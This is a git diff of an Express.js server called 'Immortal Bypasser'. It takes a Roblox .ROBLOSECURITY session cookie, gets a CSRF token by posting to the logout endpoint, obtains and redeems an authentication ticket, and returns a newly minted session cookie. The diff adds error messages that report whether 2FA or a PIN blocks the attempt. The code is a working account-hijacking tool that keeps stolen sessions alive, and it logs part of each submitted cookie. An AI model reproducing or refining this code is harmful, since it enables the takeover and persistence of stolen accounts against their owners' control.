@@ -6,45 +6,40 @@ const app = express();
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
-// ROOT
-app.get('/', (req, res) => {
-  res.send('Immortal Bypasser — LIVE');
-});
+app.get('/', (req, res) => res.send('Immortal Bypasser — LIVE'));
 
-// BYPASS
 app.post('/api/bypass', async (req, res) => {
   const { cookie } = req.body;
 
-  console.log('Received cookie length:', cookie?.length);
-  console.log('Cookie starts with:', cookie?.substring(0, 50));
+  console.log('COOKIE LENGTH:', cookie?.length || 'NONE');
+  console.log('STARTS WITH:', cookie?.substring(0, 50) || 'NONE');
 
-  if (!cookie) {
-    return res.status(400).json({ error: 'No cookie sent' });
+  if (!cookie || typeof cookie !== 'string') {
+    return res.status(400).json({ error: 'No cookie' });
   }
-
-  if (typeof cookie !== 'string') {
-    return res.status(400).json({ error: 'Cookie must be string' });
-  }
-
   if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
-    return res.status(400).json({ error: 'Not a valid .ROBLOSECURITY' });
+    return res.status(400).json({ error: 'Invalid .ROBLOSECURITY format' });
   }
 
   try {
-    // 1. GET CSRF TOKEN
-    const logoutRes = await axios.post('https://auth.roblox.com/v2/logout', {}, {
-      headers: { 
+    // 1. LOGOUT TO GET CSRF
+    const logout = await axios.post('https://auth.roblox.com/v2/logout', {}, {
+      headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        'User-Agent': 'Mozilla/5.0'
       },
       maxRedirects: 0,
       validateStatus: () => true
     });
 
-    const csrf = logoutRes.headers['x-csrf-token'];
+    const csrf = logout.headers['x-csrf-token'];
+    console.log('CSRF:', csrf ? 'GOT' : 'NONE');
+    console.log('LOGOUT STATUS:', logout.status);
+
     if (!csrf) {
-      console.log('No CSRF token. Status:', logoutRes.status);
-      return res.status(400).json({ error: 'Cookie dead or 2FA' });
+      if (logout.status === 403) return res.status(400).json({ error: '2FA or PIN enabled' });
+      if (logout.status === 401) return res.status(400).json({ error: 'Cookie expired' });
+      return res.status(400).json({ error: 'No CSRF — cookie dead' });
     }
 
     // 2. GET TICKET
@@ -52,49 +47,40 @@ app.post('/api/bypass', async (req, res) => {
       headers: {
         'x-csrf-token': csrf,
         'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'Referer': 'https://www.roblox.com/',
-        'User-Agent': 'Mozilla/5.0'
+        'Referer': 'https://www.roblox.com/'
       },
       validateStatus: status => status < 500
     });
 
     const ticket = ticketRes.headers['rbx-authentication-ticket'];
     if (!ticket) {
-      console.log('No ticket. Response:', ticketRes.data);
+      console.log('TICKET FAILED:', ticketRes.data);
       return res.status(400).json({ error: 'No ticket — account locked' });
     }
 
     // 3. REDEEM
-    const redeemRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', {
+    const redeem = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', {
       authenticationTicket: ticket
     }, {
-      headers: { 
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0'
-      }
+      headers: { 'Content-Type': 'application/json' }
     });
 
-    const newCookie = redeemRes.headers['set-cookie']
+    const newCookie = redeem.headers['set-cookie']
       ?.find(c => c.includes('.ROBLOSECURITY'))
       ?.split(';')[0]
       ?.split('=')[1];
 
-    if (!newCookie) {
-      return res.status(500).json({ error: 'Failed to extract new cookie' });
-    }
+    if (!newCookie) return res.status(500).json({ error: 'No new cookie in response' });
 
-    console.log('SUCCESS — New cookie issued');
     res.json({ success: true, newCookie });
 
   } catch (error) {
-    console.error('BYPASS ERROR:', error.message);
-    const msg = error.response?.data || error.message;
-    res.status(500).json({ error: msg });
+    console.error('FULL ERROR:', error.response?.data || error.message);
+    const errMsg = error.response?.data || error.message || 'Unknown';
+    res.status(500).json({ error: typeof errMsg === 'object' ? JSON.stringify(errMsg) : errMsg });
   }
 });
 
-// LISTEN
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`SERVER LIVE ON PORT ${PORT}`);
+app.listen(process.env.PORT || 3000, '0.0.0.0', () => {
+  console.log('SERVER LIVE');
 });
